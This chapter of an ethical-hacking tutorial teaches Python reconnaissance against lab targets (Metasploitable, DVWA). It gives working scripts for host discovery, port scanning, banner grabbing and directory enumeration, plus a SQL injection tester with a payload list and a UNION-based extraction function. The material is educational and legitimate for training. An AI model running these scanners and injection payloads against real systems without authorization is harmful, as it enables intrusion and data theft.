# Chapter 6: Hands-On Network Reconnaissance with Python

## Tutorial Overview

In this hands-on tutorial, you'll learn to perform network reconnaissance using Python - one of the most critical first steps in ethical hacking. We'll walk through real scenarios step-by-step, building tools to discover hosts, scan ports, and gather intelligence about target systems.

**⚠️ AUTHORIZATION WARNING: Only perform these techniques on:**
- Systems you own
- Lab environments you've set up
- Networks with explicit written permission
- Authorized penetration testing engagements

**What You'll Learn:**
- Host discovery techniques using Python
- Port scanning methodologies
- Service fingerprinting
- Banner grabbing for version detection
- Network mapping and visualization

## Lab Setup: Creating Your Test Environment

Before we begin, let's set up a safe testing environment:

### Step 1: Environment Setup

**Target Setup:**
1. **Primary Target**: Use Metasploitable 2 (downloadable vulnerable VM)
2. **Secondary Target**: Scanme.nmap.org (authorized scanning target)
3. **Local Network**: Your own lab network (192.168.x.x range)

**Install Required Tools:**
```bash
# Install Python libraries
pip install python-nmap scapy requests beautifulsoup4

# Verify installations
python3 -c "import nmap; import scapy.all; print('Libraries installed successfully')"
```

**Network Diagram of Our Lab:**
```
[Kali Linux - Attacker]     [Target Network 192.168.1.0/24]
192.168.1.100        →        |
                              ├─ 192.168.1.10 (Metasploitable)
                              ├─ 192.168.1.20 (Windows Target)
                              └─ 192.168.1.1 (Router/Gateway)
```

## Tutorial 1: Network Host Discovery

### Scenario: Corporate Network Assessment
You've been hired to assess a company's network security. Your first task is to discover all active hosts in their 192.168.1.0/24 network.

### Step 1: Build a Python Ping Sweeper

**Create file: `host_discovery.py`**
```python
#!/usr/bin/env python3
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor
import argparse
from datetime import datetime

class NetworkScanner:
    def __init__(self, network_base="192.168.1", threads=50):
        self.network_base = network_base
        self.threads = threads
        self.active_hosts = []
        self.lock = threading.Lock()
    
    def ping_host(self, host_num):
        """Ping a single host and record if active"""
        ip = f"{self.network_base}.{host_num}"
        
        try:
            # Use ping with 1 second timeout
            result = subprocess.run(
                ["ping", "-c", "1", "-W", "1000", ip],
                capture_output=True, timeout=2
            )
            
            if result.returncode == 0:
                with self.lock:
                    self.active_hosts.append(ip)
                    print(f"\033[92m[+] {ip} is ALIVE\033[0m")
            else:
                print(f"\033[91m[-] {ip} is DOWN\033[0m")
                
        except subprocess.TimeoutExpired:
            print(f"\033[93m[!] {ip} TIMEOUT\033[0m")
        except Exception as e:
            print(f"\033[91m[ERROR] {ip}: {e}\033[0m")
    
    def scan_network(self, start_ip=1, end_ip=254):
        """Perform threaded network scan"""
        print(f"\n[*] Starting network discovery on {self.network_base}.{start_ip}-{end_ip}")
        print(f"[*] Using {self.threads} threads")
        print(f"[*] Scan started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("-" * 60)
        
        # Use ThreadPoolExecutor for efficient scanning
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            host_range = range(start_ip, end_ip + 1)
            executor.map(self.ping_host, host_range)
        
        print("-" * 60)
        print(f"\n[*] Scan completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[*] Found {len(self.active_hosts)} active hosts:")
        
        for host in sorted(self.active_hosts, key=lambda x: int(x.split('.')[-1])):
            print(f"    → {host}")
        
        return self.active_hosts

# Usage example
if __name__ == "__main__":
    scanner = NetworkScanner("192.168.1", threads=30)
    active_hosts = scanner.scan_network(1, 20)  # Scan first 20 IPs
```

### Step 2: Run Your First Scan

**Execute the script:**
```bash
python3 host_discovery.py
```

**Expected Output:**
```
[*] Starting network discovery on 192.168.1.1-20
[*] Using 30 threads
[*] Scan started at 2024-01-15 10:30:45
------------------------------------------------------------
[+] 192.168.1.1 is ALIVE
[-] 192.168.1.2 is DOWN
[-] 192.168.1.3 is DOWN
[+] 192.168.1.10 is ALIVE
[+] 192.168.1.15 is ALIVE
...
------------------------------------------------------------
[*] Scan completed at 2024-01-15 10:30:52
[*] Found 3 active hosts:
    → 192.168.1.1
    → 192.168.1.10
    → 192.168.1.15
```

**🎯 What This Tells Us:**
- 192.168.1.1: Likely the router/gateway
- 192.168.1.10: Could be a server or workstation
- 192.168.1.15: Another active device

### Step 3: Enhanced Host Discovery with TCP Ping

Some hosts block ICMP but respond to TCP connections. Let's add TCP ping capability:

```python
import socket

def tcp_ping(ip, port, timeout=1):
    """Check if TCP port is open (TCP ping)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def advanced_host_discovery(network_base, common_ports=[80, 443, 22, 21]):
    """Discover hosts using both ICMP and TCP ping"""
    discovered_hosts = set()
    
    for i in range(1, 255):
        ip = f"{network_base}.{i}"
        
        # Try ICMP first
        if ping_host_simple(ip):
            discovered_hosts.add(ip)
            print(f"[ICMP] {ip} discovered")
            continue
        
        # Try TCP ping on common ports
        for port in common_ports:
            if tcp_ping(ip, port):
                discovered_hosts.add(ip)
                print(f"[TCP:{port}] {ip} discovered")
                break
    
    return list(discovered_hosts)
```

## Tutorial 2: Advanced Port Scanning

### Scenario: Service Discovery
Now that we've discovered active hosts (192.168.1.10), let's identify what services are running and find potential entry points.

### Step 1: Build a Professional Port Scanner

**Create file: `advanced_port_scanner.py`**
```python
#!/usr/bin/env python3
import socket
import threading
from concurrent.futures import ThreadPoolExecutor
import argparse
import json
import time
from datetime import datetime

class AdvancedPortScanner:
    def __init__(self, target, threads=100, timeout=3):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.open_ports = []
        self.filtered_ports = []
        self.services_detected = {}
        self.lock = threading.Lock()
        
        # Common service mappings
        self.services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP',
            443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S', 3389: 'RDP',
            3306: 'MySQL', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis'
        }
    
    def scan_port(self, port):
        """Scan individual port with banner grabbing"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            start_time = time.time()
            result = sock.connect_ex((self.target, port))
            response_time = (time.time() - start_time) * 1000
            
            if result == 0:
                service_name = self.services.get(port, 'Unknown')
                
                # Attempt banner grabbing
                banner = self.grab_banner(sock, port)
                
                with self.lock:
                    self.open_ports.append(port)
                    self.services_detected[port] = {
                        'service': service_name,
                        'banner': banner,
                        'response_time': round(response_time, 2)
                    }
                
                banner_info = f" ({banner[:30]}...)" if banner else ""
                print(f"\033[92m[+] {port}/tcp OPEN\033[0m - {service_name}{banner_info}")
            
            sock.close()
            
        except socket.timeout:
            with self.lock:
                self.filtered_ports.append(port)
            print(f"\033[93m[?] {port}/tcp FILTERED\033[0m")
        except Exception as e:
            print(f"\033[91m[ERROR] Port {port}: {e}\033[0m")
    
    def grab_banner(self, sock, port):
        """Attempt to grab service banner"""
        try:
            # Send appropriate probe based on service
            if port == 80:
                sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
            elif port == 21:
                pass  # FTP sends banner automatically
            elif port == 25:
                sock.send(b"HELO test\r\n")
            elif port == 110:
                pass  # POP3 sends banner automatically
            
            # Receive banner
            sock.settimeout(2)
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            return banner if banner else None
            
        except:
            return None
    
    def scan_ports(self, ports):
        """Scan multiple ports with threading"""
        print(f"\n[*] Starting advanced port scan on {self.target}")
        print(f"[*] Ports to scan: {len(ports)}")
        print(f"[*] Threads: {self.threads}")
        print(f"[*] Timeout: {self.timeout}s")
        print("-" * 70)
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.scan_port, ports)
        
        scan_time = time.time() - start_time
        
        print("-" * 70)
        print(f"\n[*] Scan completed in {scan_time:.2f} seconds")
        print(f"[*] Open ports: {len(self.open_ports)}")
        print(f"[*] Filtered ports: {len(self.filtered_ports)}")
        
        return self.generate_report()
    
    def generate_report(self):
        """Generate detailed scan report"""
        report = {
            'target': self.target,
            'scan_time': datetime.now().isoformat(),
            'open_ports': self.open_ports,
            'services': self.services_detected,
            'summary': {
                'total_open': len(self.open_ports),
                'total_filtered': len(self.filtered_ports),
                'critical_services': self.identify_critical_services(),
                'attack_vectors': self.suggest_attack_vectors()
            }
        }
        return report
    
    def identify_critical_services(self):
        """Identify potentially vulnerable services"""
        critical_ports = {
            21: 'FTP - Often allows anonymous access',
            23: 'Telnet - Unencrypted protocol',
            25: 'SMTP - Email server, potential relay',
            53: 'DNS - Zone transfer possible',
            135: 'RPC - Windows RPC endpoint',
            139: 'NetBIOS - SMB shares accessible',
            445: 'SMB - File sharing protocol',
            1433: 'MSSQL - Database server',
            3389: 'RDP - Remote desktop access',
            5900: 'VNC - Remote desktop (often no auth)'
        }
        
        found_critical = {}
        for port in self.open_ports:
            if port in critical_ports:
                found_critical[port] = critical_ports[port]
        
        return found_critical
    
    def suggest_attack_vectors(self):
        """Suggest potential attack vectors based on open ports"""
        vectors = []
        
        for port in self.open_ports:
            if port == 21:
                vectors.append("Anonymous FTP access - try anonymous:anonymous")
            elif port == 22:
                vectors.append("SSH brute force - try common credentials")
            elif port == 23:
                vectors.append("Telnet access - try default passwords")
            elif port in [80, 443]:
                vectors.append("Web application testing - directory enumeration, SQL injection")
            elif port == 139 or port == 445:
                vectors.append("SMB enumeration - null sessions, share discovery")
            elif port == 3389:
                vectors.append("RDP access - brute force attack")
        
        return vectors

# Common port ranges for different scan types
PORT_RANGES = {
    'top_20': [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080],
    'top_100': list(range(1, 101)),
    'top_1000': [1,3,4,6,7,9,13,17,19,20,21,22,23,24,25,26,30,32,33,37,42,43,49,53,70,79,80,81,82,83,84,85,88,89,90,99,100,106,109,110,111,113,119,125,135,139,143,144,146,161,163,179,199,211,212,222,254,255,256,259,264,280,301,306,311,340,366,389,406,407,416,417,425,427,443,444,445,458,464,465,481,497,500,512,513,514,515,524,541,543,544,545,548,554,555,563,587,593,616,617,625,631,636,646,648,666,667,668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800,801,808,843,873,880,888,898,900,901,902,903,911,912,981,987,990,992,993,995,999,1000,1001,1002,1007,1009,1010,1011,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100]
}

if __name__ == "__main__":
    # Example usage
    target = input("Enter target IP: ")
    scanner = AdvancedPortScanner(target, threads=50, timeout=2)
    
    print("\nSelect scan type:")
    print("1. Top 20 ports (fast)")
    print("2. Top 100 ports (medium)")
    print("3. Top 1000 ports (comprehensive)")
    print("4. Custom range")
    
    choice = input("Choice (1-4): ")
    
    if choice == "1":
        ports = PORT_RANGES['top_20']
    elif choice == "2":
        ports = PORT_RANGES['top_100']
    elif choice == "3":
        ports = PORT_RANGES['top_1000']
    else:
        start = int(input("Start port: "))
        end = int(input("End port: "))
        ports = list(range(start, end + 1))
    
    report = scanner.scan_ports(ports)
    
    # Save report
    with open(f'scan_report_{target}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json', 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\n[*] Report saved to scan_report_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
```

### Step 2: Execute Port Scan Against Metasploitable

**Run the scanner:**
```bash
python3 advanced_port_scanner.py
# Enter target IP: 192.168.1.10
# Choice: 1 (Top 20 ports)
```

**Expected Output for Metasploitable:**
```
[*] Starting advanced port scan on 192.168.1.10
[*] Ports to scan: 20
[*] Threads: 50
[*] Timeout: 2s
----------------------------------------------------------------------
[+] 21/tcp OPEN - FTP (220 (vsFTPd 2.3.4))
[+] 22/tcp OPEN - SSH (SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1)
[+] 23/tcp OPEN - Telnet
[+] 25/tcp OPEN - SMTP (220 metasploitable.localdomain ESMTP Postfix)
[+] 53/tcp OPEN - DNS
[+] 80/tcp OPEN - HTTP (HTTP/1.1 200 OK Date: Mon, 15 Jan 2024...)
[+] 139/tcp OPEN - NetBIOS
[+] 445/tcp OPEN - SMB
[+] 3306/tcp OPEN - MySQL
[+] 5900/tcp OPEN - VNC
----------------------------------------------------------------------

[*] Scan completed in 2.45 seconds
[*] Open ports: 10
[*] Filtered ports: 0
```

**🎯 Critical Findings Analysis:**
- **Port 21 (FTP)**: vsFTPd 2.3.4 - VULNERABLE! (Backdoor command execution)
- **Port 22 (SSH)**: OpenSSH 4.7p1 - Old version, potential vulnerabilities
- **Port 23 (Telnet)**: Unencrypted protocol - credential sniffing possible
- **Port 80 (HTTP)**: Web server - directory enumeration, web app attacks
- **Port 3306 (MySQL)**: Database exposed - brute force, weak passwords
- **Port 5900 (VNC)**: Remote desktop - often no authentication

### Step 3: Service Version Detection

**Add version detection to your scanner:**
```python
def detailed_service_scan(self, port):
    """Perform detailed service detection"""
    version_probes = {
        21: b"",  # FTP banner comes automatically
        22: b"",  # SSH banner comes automatically  
        25: b"HELO test\r\n",
        80: b"GET / HTTP/1.1\r\nHost: target\r\n\r\n",
        110: b"",  # POP3 banner automatic
        143: b". CAPABILITY\r\n",  # IMAP
        443: b"GET / HTTP/1.1\r\nHost: target\r\n\r\n",
        993: b". CAPABILITY\r\n",  # IMAPS
        995: b"",  # POP3S
        3306: b"\x3a\x00\x00\x00\x0a",  # MySQL handshake
        3389: b"\x03\x00\x00\x13",  # RDP probe
        5432: b"",  # PostgreSQL
        5900: b"RFB 003.003\n"  # VNC
    }
    
    probe = version_probes.get(port, b"")
    # Implementation details...
```

## Tutorial 3: Web Application Vulnerability Testing

### Scenario: Web Application Security Assessment
You've discovered a web server running on port 80 (192.168.1.10). Now let's perform a comprehensive web application security assessment.

### Step 1: Initial Web Reconnaissance

**Create file: `web_recon.py`**
```python
#!/usr/bin/env python3
import requests
import urllib3
from bs4 import BeautifulSoup
import urllib.parse
import re
from urllib.parse import urljoin, urlparse
import time
import random

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WebReconnaissance:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.session.verify = False
        self.discovered_paths = set()
        self.forms = []
        self.technologies = []
    
    def initial_probe(self):
        """Perform initial web server probing"""
        print(f"\n[*] Starting web reconnaissance on {self.target_url}")
        print("-" * 60)
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            
            # Basic server info
            print(f"[+] HTTP Status: {response.status_code}")
            print(f"[+] Server: {response.headers.get('Server', 'Unknown')}")
            print(f"[+] Content-Type: {response.headers.get('Content-Type', 'Unknown')}")
            print(f"[+] Content-Length: {len(response.content)} bytes")
            
            # Security headers check
            self.check_security_headers(response)
            
            # Technology detection
            self.detect_technologies(response)
            
            # Extract forms and links
            self.extract_forms_and_links(response)
            
            return response
            
        except requests.RequestException as e:
            print(f"[ERROR] Failed to connect: {e}")
            return None
    
    def check_security_headers(self, response):
        """Check for security headers"""
        print("\n[*] Security Headers Analysis:")
        
        security_headers = {
            'X-Frame-Options': 'Clickjacking protection',
            'X-XSS-Protection': 'XSS filter',
            'X-Content-Type-Options': 'MIME type sniffing protection',
            'Strict-Transport-Security': 'HTTPS enforcement',
            'Content-Security-Policy': 'Content Security Policy',
            'X-Powered-By': 'Server technology disclosure'
        }
        
        for header, description in security_headers.items():
            value = response.headers.get(header)
            if value:
                if header == 'X-Powered-By':
                    print(f"\033[93m[!] {header}: {value} (Information Disclosure)\033[0m")
                else:
                    print(f"\033[92m[+] {header}: {value}\033[0m")
            else:
                print(f"\033[91m[-] {header}: Missing ({description})\033[0m")
    
    def detect_technologies(self, response):
        """Detect web technologies"""
        print("\n[*] Technology Detection:")
        
        # Server header
        server = response.headers.get('Server', '')
        if 'Apache' in server:
            print(f"\033[92m[+] Web Server: Apache {server}\033[0m")
        elif 'nginx' in server:
            print(f"\033[92m[+] Web Server: nginx {server}\033[0m")
        elif 'IIS' in server:
            print(f"\033[92m[+] Web Server: Microsoft IIS {server}\033[0m")
        
        # Content analysis
        content = response.text.lower()
        
        if 'php' in response.headers.get('X-Powered-By', '').lower():
            print(f"\033[92m[+] Backend: PHP\033[0m")
        
        # Common CMS detection
        if 'wp-content' in content or 'wordpress' in content:
            print(f"\033[92m[+] CMS: WordPress detected\033[0m")
        elif 'joomla' in content:
            print(f"\033[92m[+] CMS: Joomla detected\033[0m")
        elif 'drupal' in content:
            print(f"\033[92m[+] CMS: Drupal detected\033[0m")
        
        # JavaScript frameworks
        if 'jquery' in content:
            print(f"\033[94m[+] JavaScript: jQuery detected\033[0m")
        if 'angular' in content:
            print(f"\033[94m[+] JavaScript: AngularJS detected\033[0m")
        if 'react' in content:
            print(f"\033[94m[+] JavaScript: React detected\033[0m")
    
    def extract_forms_and_links(self, response):
        """Extract forms and interesting links"""
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Extract forms
        forms = soup.find_all('form')
        print(f"\n[*] Found {len(forms)} forms:")
        
        for i, form in enumerate(forms):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            
            # Get form inputs
            inputs = []
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_name = input_tag.get('name', 'unnamed')
                input_type = input_tag.get('type', 'text')
                inputs.append(f"{input_name}({input_type})")
            
            print(f"  Form {i+1}: {method} {action}")
            print(f"    Inputs: {', '.join(inputs)}")
            
            self.forms.append({
                'action': urljoin(self.target_url, action),
                'method': method,
                'inputs': inputs
            })
        
        # Extract interesting links
        links = soup.find_all('a', href=True)
        interesting_extensions = ['.php', '.asp', '.aspx', '.jsp', '.do', '.action']
        
        print(f"\n[*] Interesting links found:")
        for link in links[:10]:  # Show first 10
            href = link['href']
            if any(ext in href for ext in interesting_extensions):
                full_url = urljoin(self.target_url, href)
                print(f"  {full_url}")
                self.discovered_paths.add(href)
    
    def directory_enumeration(self):
        """Perform directory enumeration"""
        print(f"\n[*] Starting directory enumeration...")
        
        # Common web directories
        common_dirs = [
            'admin', 'administrator', 'login', 'wp-admin', 'cpanel',
            'config', 'backup', 'backups', 'old', 'test', 'temp',
            'uploads', 'files', 'images', 'css', 'js', 'scripts',
            'cgi-bin', 'phpmyadmin', 'mysql', 'sql', 'database',
            'api', 'v1', 'v2', 'docs', 'documentation', 'manual'
        ]
        
        # Common files
        common_files = [
            'robots.txt', 'sitemap.xml', '.htaccess', 'web.config',
            'config.php', 'wp-config.php', 'database.php',
            'readme.txt', 'changelog.txt', 'version.txt',
            'phpinfo.php', 'info.php', 'test.php'
        ]
        
        found_items = []
        total_items = len(common_dirs) + len(common_files)
        current_item = 0
        
        # Test directories
        for directory in common_dirs:
            current_item += 1
            test_url = f"{self.target_url}/{directory}/"
            
            try:
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    print(f"\033[92m[+] Directory found: /{directory}/\033[0m")
                    found_items.append(('directory', directory, response.status_code))
                elif response.status_code in [301, 302, 307, 308]:
                    redirect = response.headers.get('Location', '')
                    print(f"\033[93m[+] Directory redirect: /{directory}/ -> {redirect}\033[0m")
                    found_items.append(('redirect', directory, response.status_code))
                elif response.status_code == 403:
                    print(f"\033[94m[+] Directory exists (403): /{directory}/\033[0m")
                    found_items.append(('forbidden', directory, response.status_code))
                
                # Rate limiting
                time.sleep(random.uniform(0.1, 0.3))
                
            except requests.RequestException:
                continue
            
            # Progress indicator
            if current_item % 10 == 0:
                progress = (current_item / total_items) * 100
                print(f"[*] Progress: {progress:.1f}% ({current_item}/{total_items})")
        
        # Test files
        for filename in common_files:
            current_item += 1
            test_url = f"{self.target_url}/{filename}"
            
            try:
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    content_length = len(response.content)
                    print(f"\033[92m[+] File found: /{filename} ({content_length} bytes)\033[0m")
                    found_items.append(('file', filename, response.status_code))
                    
                    # Special handling for interesting files
                    if filename == 'robots.txt':
                        print("    Content preview:")
                        print(f"    {response.text[:200]}...")
                
                time.sleep(random.uniform(0.1, 0.3))
                
            except requests.RequestException:
                continue
        
        print(f"\n[*] Directory enumeration completed")
        print(f"[*] Found {len(found_items)} items")
        
        return found_items

# Usage example
if __name__ == "__main__":
    target = input("Enter target URL (e.g., http://192.168.1.10): ")
    
    recon = WebReconnaissance(target)
    
    print("\n" + "="*70)
    print("    WEB APPLICATION RECONNAISSANCE")
    print("="*70)
    
    # Initial probe
    response = recon.initial_probe()
    
    if response:
        # Directory enumeration
        found_items = recon.directory_enumeration()
        
        # Summary
        print("\n" + "="*70)
        print("    RECONNAISSANCE SUMMARY")
        print("="*70)
        print(f"Target: {target}")
        print(f"Forms discovered: {len(recon.forms)}")
        print(f"Directories/files found: {len(found_items)}")
        
        if recon.forms:
            print("\n[*] Attack vectors identified:")
            for form in recon.forms:
                print(f"  → Form testing: {form['method']} {form['action']}")
                if any('password' in inp.lower() for inp in form['inputs']):
                    print(f"    ⚠️  Login form detected - brute force possible")
                if any('search' in inp.lower() for inp in form['inputs']):
                    print(f"    ⚠️  Search form - SQL injection possible")
```

### Step 2: Execute Web Reconnaissance

**Run against DVWA or Metasploitable:**
```bash
python3 web_recon.py
# Enter target URL: http://192.168.1.10
```

**Expected Output:**
```
======================================================================
    WEB APPLICATION RECONNAISSANCE
======================================================================

[*] Starting web reconnaissance on http://192.168.1.10
------------------------------------------------------------
[+] HTTP Status: 200
[+] Server: Apache/2.2.8 (Ubuntu) DAV/2
[+] Content-Type: text/html
[+] Content-Length: 891 bytes

[*] Security Headers Analysis:
[-] X-Frame-Options: Missing (Clickjacking protection)
[-] X-XSS-Protection: Missing (XSS filter)
[-] X-Content-Type-Options: Missing (MIME type sniffing protection)
[-] Strict-Transport-Security: Missing (HTTPS enforcement)
[-] Content-Security-Policy: Missing (Content Security Policy)
[!] X-Powered-By: PHP/5.2.4-2ubuntu5.10 (Information Disclosure)

[*] Technology Detection:
[+] Web Server: Apache Apache/2.2.8 (Ubuntu) DAV/2
[+] Backend: PHP

[*] Found 0 forms:

[*] Interesting links found:
  http://192.168.1.10/phpMyAdmin/
  http://192.168.1.10/mutillidae/
  http://192.168.1.10/dvwa/

[*] Starting directory enumeration...
[+] Directory found: /phpmyadmin/
[+] Directory found: /mutillidae/
[+] Directory found: /dvwa/
[+] File found: /robots.txt (26 bytes)
    Content preview:
    User-agent: *
Disallow:

[*] Directory enumeration completed
[*] Found 4 items
```

### Step 3: SQL Injection Testing

**Now let's test the DVWA application for SQL injection:**

**Create file: `sql_injection_test.py`**
```python
#!/usr/bin/env python3
import requests
import urllib3
import re
import time
from urllib.parse import urlencode

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SQLInjectionTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
    
    def test_sql_injection(self, param_name, base_params=None):
        """Test for SQL injection in a specific parameter"""
        if base_params is None:
            base_params = {}
        
        print(f"\n[*] Testing parameter '{param_name}' for SQL injection...")
        print("-" * 50)
        
        # SQL injection payloads (ordered by detection reliability)
        payloads = [
            "'",                                    # Basic quote
            "' OR '1'='1",                         # Boolean-based
            "' OR '1'='1' --",                     # Boolean with comment
            "' OR '1'='1' /*",                     # Boolean with MySQL comment
            "'; WAITFOR DELAY '00:00:05' --",      # Time-based (SQL Server)
            "' OR SLEEP(5) --",                    # Time-based (MySQL)
            "' OR pg_sleep(5) --",                 # Time-based (PostgreSQL)
            "' UNION SELECT NULL,NULL --",         # Union-based
            "' UNION SELECT 1,2,3,4,5 --",        # Union column enumeration
            "' AND (SELECT COUNT(*) FROM users) > 0 --",  # Boolean blind
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5' --"  # Version detection
        ]
        
        vulnerable_payloads = []
        
        for i, payload in enumerate(payloads):
            print(f"[{i+1}/{len(payloads)}] Testing: {payload[:30]}...", end='')
            
            # Prepare test parameters
            test_params = base_params.copy()
            test_params[param_name] = payload
            
            try:
                start_time = time.time()
                response = self.session.get(self.target_url, params=test_params, timeout=15)
                response_time = time.time() - start_time
                
                # Check for SQL errors
                if self.detect_sql_errors(response.text):
                    print(f" \033[91m[VULNERABLE - SQL ERROR]\033[0m")
                    vulnerable_payloads.append({
                        'payload': payload,
                        'type': 'Error-based',
                        'evidence': 'SQL error in response',
                        'response_time': response_time
                    })
                    
                # Check for time-based injection (response time > 4 seconds)
                elif response_time > 4 and ('SLEEP' in payload or 'WAITFOR' in payload or 'pg_sleep' in payload):
                    print(f" \033[91m[VULNERABLE - TIME-BASED]\033[0m (Response: {response_time:.2f}s)")
                    vulnerable_payloads.append({
                        'payload': payload,
                        'type': 'Time-based blind',
                        'evidence': f'Delayed response: {response_time:.2f} seconds',
                        'response_time': response_time
                    })
                    
                # Check for boolean-based injection (different response)
                elif 'OR' in payload and len(response.text) != len(self.get_normal_response(param_name, base_params)):
                    print(f" \033[93m[POSSIBLE - BOOLEAN]\033[0m")
                    vulnerable_payloads.append({
                        'payload': payload,
                        'type': 'Boolean-based blind',
                        'evidence': 'Different response length',
                        'response_time': response_time
                    })
                    
                else:
                    print(f" \033[92m[SAFE]\033[0m")
                    
            except requests.RequestException as e:
                print(f" \033[91m[ERROR: {e}]\033[0m")
            
            # Small delay between requests
            time.sleep(0.5)
        
        return vulnerable_payloads
    
    def detect_sql_errors(self, response_text):
        """Detect SQL error patterns in response"""
        sql_error_patterns = [
            # MySQL
            r"MySQL.*Error",
            r"Warning.*mysql.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL server version",
            
            # SQL Server
            r"Microsoft.*ODBC.*SQL Server",
            r"SQLServer JDBC Driver",
            r"SqlException",
            r"System.Data.SqlClient.SqlException",
            
            # Oracle
            r"ORA-\d{5}",
            r"Oracle.*Driver",
            r"Oracle.*Error",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            
            # Generic
            r"SQL syntax.*error",
            r"syntax error at or near",
            r"unclosed quotation mark",
            r"quoted string not properly terminated"
        ]
        
        for pattern in sql_error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False
    
    def get_normal_response(self, param_name, base_params):
        """Get normal response for comparison"""
        normal_params = base_params.copy()
        normal_params[param_name] = '1'  # Normal value
        
        try:
            response = self.session.get(self.target_url, params=normal_params, timeout=10)
            return response.text
        except:
            return ""
    
    def exploit_sql_injection(self, vulnerable_param, base_params=None):
        """Attempt to exploit confirmed SQL injection"""
        if base_params is None:
            base_params = {}
            
        print(f"\n[*] Attempting to exploit SQL injection in '{vulnerable_param}'...")
        
        # Information gathering payloads
        info_payloads = {
            "Database Version": "' UNION SELECT @@version,NULL --",
            "Current User": "' UNION SELECT user(),NULL --",
            "Current Database": "' UNION SELECT database(),NULL --",
            "List Tables": "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database() --"
        }
        
        extracted_info = {}
        
        for info_type, payload in info_payloads.items():
            test_params = base_params.copy()
            test_params[vulnerable_param] = payload
            
            try:
                response = self.session.get(self.target_url, params=test_params, timeout=10)
                
                # Simple extraction (would need more sophisticated parsing in real tool)
                if response.status_code == 200 and len(response.text) > 100:
                    print(f"[+] {info_type}: Payload executed successfully")
                    extracted_info[info_type] = "Data extracted (parse response manually)"
                else:
                    print(f"[-] {info_type}: Failed or no data")
                    
            except requests.RequestException as e:
                print(f"[ERROR] {info_type}: {e}")
            
            time.sleep(1)
        
        return extracted_info

# Example usage for DVWA
if __name__ == "__main__":
    # DVWA SQL Injection (Low Security)
    dvwa_url = "http://192.168.1.10/dvwa/vulnerabilities/sqli/"
    
    print("\n" + "="*70)
    print("    SQL INJECTION TESTING TOOL")
    print("="*70)
    
    tester = SQLInjectionTester(dvwa_url)
    
    # First, you need to login to DVWA and get session cookie
    print("[*] Note: Make sure you're logged into DVWA first!")
    print("[*] Security level should be set to 'Low' for testing")
    
    # Test the 'id' parameter in DVWA
    vulnerabilities = tester.test_sql_injection('id', {'Submit': 'Submit'})
    
    if vulnerabilities:
        print(f"\n\033[91m[CRITICAL] SQL Injection vulnerabilities found!\033[0m")
        print("\nVulnerability Details:")
        for vuln in vulnerabilities:
            print(f"  Type: {vuln['type']}")
            print(f"  Payload: {vuln['payload']}")
            print(f"  Evidence: {vuln['evidence']}")
            print(f"  Response Time: {vuln['response_time']:.2f}s")
            print("-" * 30)
        
        # Attempt exploitation on first vulnerability
        if vulnerabilities:
            print("\n[*] Attempting exploitation...")
            extracted = tester.exploit_sql_injection('id', {'Submit': 'Submit'})
    else:
        print("\n\033[92m[SECURE] No SQL injection vulnerabilities detected.\033[0m")
```

**🎯 Hands-On Exercise:**
1. Set up DVWA in your lab environment
2. Set security level to "Low"
3. Run the SQL injection test
4. Observe the different types of SQL injection detection
5. Try manually confirming the vulnerabilities in a browser

This step-by-step approach gives you practical, hands-on experience with real vulnerability testing techniques!

